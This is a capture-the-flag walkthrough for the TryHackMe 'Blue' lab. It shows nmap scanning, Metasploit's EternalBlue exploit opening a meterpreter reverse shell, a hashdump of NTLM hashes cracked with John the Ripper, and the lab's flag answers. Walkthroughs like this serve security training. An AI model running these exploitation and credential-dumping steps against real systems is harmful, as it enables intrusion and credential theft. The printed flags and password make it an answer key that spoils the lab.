```
Machine: Blue
Platform: TryHackMe
Difficulty: Easy
```

## WALKTHROUGH:
The machine can be found [here](https://tryhackme.com/r/room/blue)

### Reconnaissance:
Let start with the Nmap Vulnerability Scan using following command `sudo nmap -sV -sC -vv --script vuln $IP`

```console
┌──(kali@kali)-[~/Machine/THM/Blue]
└─$ sudo nmap -sV -sC-vv --script vuln 10.10.225.165
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-04 06:32 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:32
Completed NSE at 06:32, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Initiating Ping Scan at 06:32
Scanning 10.10.225.165 [4 ports]
Completed Ping Scan at 06:32, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:32
Completed Parallel DNS resolution of 1 host. at 06:32, 0.04s elapsed
Initiating SYN Stealth Scan at 06:32
Scanning 10.10.225.165 [1000 ports]
Discovered open port 445/tcp on 10.10.225.165
Discovered open port 3389/tcp on 10.10.225.165
Discovered open port 135/tcp on 10.10.225.165
Discovered open port 139/tcp on 10.10.225.165
Discovered open port 49154/tcp on 10.10.225.165
Discovered open port 49159/tcp on 10.10.225.165
Discovered open port 49152/tcp on 10.10.225.165
Discovered open port 49153/tcp on 10.10.225.165
Discovered open port 49158/tcp on 10.10.225.165
Completed SYN Stealth Scan at 06:32, 19.67s elapsed (1000 total ports)
Initiating Service scan at 06:32
Scanning 9 services on 10.10.225.165
Service scan Timing: About 44.44% done; ETC: 06:35 (0:01:16 remaining)
Completed Service scan at 06:35, 125.03s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.225.165.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:35
NSE Timing: About 99.82% done; ETC: 06:35 (0:00:00 remaining)
NSE Timing: About 99.91% done; ETC: 06:36 (0:00:00 remaining)
Completed NSE at 06:36, 61.13s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:36
NSE: [ssl-ccs-injection 10.10.225.165:3389] No response from server: ERROR
Completed NSE at 06:36, 13.97s elapsed
Nmap scan report for 10.10.225.165
Host is up, received reset ttl 125 (0.42s latency).
Scanned at 2024-07-04 06:32:39 EDT for 220s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.84 seconds
           Raw packets sent: 1330 (58.496KB) | Rcvd: 1095 (43.836KB)
```

This scan depicts that the machine is vulnerable to `ms17-010`

### Exploitation

We will use `msfconsole` for exploitation

```console
┌──(kali㉿kali)-[~/Machine/THM/Blue]
└─$ msfconsole
                                                  /
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm\u23e3~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:T\u042fiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `

       =[ metasploit v6.3.5-dev-                          ]
+ -- --=[ 2294 exploits: 1201 auxiliary: 410 post       ]
+ -- --=[ 968 payloads: 45 encoders: 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

We will use module 0

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                             cs/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.190.255    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
: ----
   0   Automatic Target

View the full module info with the info, or info -d command.

```

Set the `RHOSTS` attribute to the machine IP address as shown below

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.190.255
RHOSTS => 10.10.190.255
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.190.255    yes       The target host(s), see https://docs
                                             .metasploit.com/docs/using-metasploi
                                             t/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use
                                              for authentication. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the spec
                                             ified username
   SMBUser                         no        (Optional) The username to authentic
                                             ate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches
                                              exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit T
                                             arget. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded
                                             Standard 7 target machines.
```

Use `exploit` or `run` to start the exploitation.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit                                                                                                                                                                                                                                                                                                                            
[*] 10.10.190.255:445: Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                                               
[+] 10.10.190.255:445: Host is likely VULNERABLE to MS17-010!: Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                                           
[*] 10.10.190.255:445: Scanned 1 of 1 hosts (100% complete)                                                                                                                                                       
[+] 10.10.190.255:445: The target is vulnerable.                                                                                                                                                                       
[*] 10.10.190.255:445: Connecting to target for exploitation.                                                                                                                                                          
[+] 10.10.190.255:445: Connection established for exploitation.                                                                                                                                                        
[+] 10.10.190.255:445: Target OS selected valid for OS indicated by SMB reply                                                                                                                                                                                                                                                                                        
[+] 10.10.190.255:445: ETERNALBLUE overwrite completed successfully (0xC000000D)!                                                                                                                                   
[+] 10.10.190.255:445: =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.255:445: =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.255:445: =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

```
### Flags:

Use `shell` command to open the standard terminal on the target host.

```console
meterpreter > shell
Process 1652 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

To look for the password hashes use `hashdump` command

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0: :
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0: :
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d: :
```

Now use `John the Ripper` to crack the hash of `Jon`

```console
┌──(kali@kali)-[~/Machine/THM/Blue]
└─$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt

┌──(naahl@kali)-[~/Machine/THM/Blue]
└─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password of `Jon` is `alqfna22`. Now the first flag is in `system32`

```console
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```
**Flag 1:** `flag{access_the_machine}`

Second flag will be in `C:/Windows/System32/config`

```console
C:\Windows\system32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
```
**Flag 2:** `flag{sam_database_elevated_access}`

For the third flag we need to go in the `C:\Users` directory. From there I need to enter as `Jon` and then `documents`. In the `documents`, there was a `flag3.txt` file.

C:\Windows\system32Jon\Documents> type C: flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}

**Flag:** `flag{admin_documents_can_be_valuable}`

---
## Happy Hacking ;)
---
